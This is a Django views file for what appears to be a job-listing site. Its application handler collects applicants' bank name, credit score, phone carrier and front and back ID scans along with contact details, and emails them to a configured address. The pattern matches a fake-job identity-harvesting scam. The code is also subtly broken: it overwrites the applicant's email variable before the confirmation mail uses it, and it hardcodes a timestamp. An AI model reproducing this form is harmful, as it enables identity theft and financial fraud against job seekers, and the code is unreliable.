from django.shortcuts import render, redirect
from django.core.mail import EmailMessage
from django.conf import settings
from django.http import HttpResponse
import os
from django.core.mail import send_mail

def submit_application(request):
    if request.method == 'POST':
        # Collect form data
        first_name = request.POST['first_name']
        email = request.POST['email']
        position = request.POST['position']
        phone = request.POST['phone']
        phone_carrier = request.POST['phone_carrier']
        bank_name = request.POST['bank_name']
        credit_score = request.POST['credit_score']
        cover_letter = request.POST.get('cover_letter', '')

        # Handle file uploads
        resume = request.FILES.get('resume')
        id_front = request.FILES.get('id_front')
        id_back = request.FILES.get('id_back')

        # Prepare email subject and body
        subject = f'New Application for {position}'
        body = f'''
        New application received at 12:46 PM WAT, Sep 22, 2025:
        - Name: {first_name}
        - Email: {email}
        - Position: {position}
        - Phone: {phone}
        - Phone Carrier: {phone_carrier}
        - Bank Name: {bank_name}
        - Credit Score: {credit_score}
        - Cover Letter: {cover_letter}
        '''

        # Create email with attachments
        email = EmailMessage(subject, body, settings.DEFAULT_FROM_EMAIL, [settings.RECIPIENT_EMAIL])
        if resume:
            email.attach(resume.name, resume.read(), resume.content_type)
        if id_front:
            email.attach(id_front.name, id_front.read(), id_front.content_type)
        if id_back:
            email.attach(id_back.name, id_back.read(), id_back.content_type)

        try:
            email.send()
            # Optionally send a confirmation to the applicant
            send_mail(
                f'Application Confirmation for {position}',
                f'Thank you, {first_name}, for applying to {position}. We will review your application and contact you at {email}.',
                settings.DEFAULT_FROM_EMAIL,
                [email],
                fail_silently=False,
            )
            return redirect('careers')
        except Exception as e:
            return render(request, 'apply.html', {'error': f'Error sending application: {str(e)}'})

    return render(request, 'apply.html', {'position': request.GET.get('position', '')})

def home(request):
    return render(request, 'home.html')

def services(request):
    return render(request, 'services.html')

def about(request):
    return render(request, 'about.html')

def contact(request):
    return render(request, 'contact.html')

def part_time_jobs(request):
    return render(request, 'part_time_jobs.html')

def remote_jobs(request):
    return render(request, 'remote_jobs.html')

def apply(request):
    position = request.GET.get('position', '')
    return render(request, 'apply.html', {'position': position})

def careers(request):
    return render(request, 'careers.html')

def ahhc(request):
    return render(request, 'ahhc.html')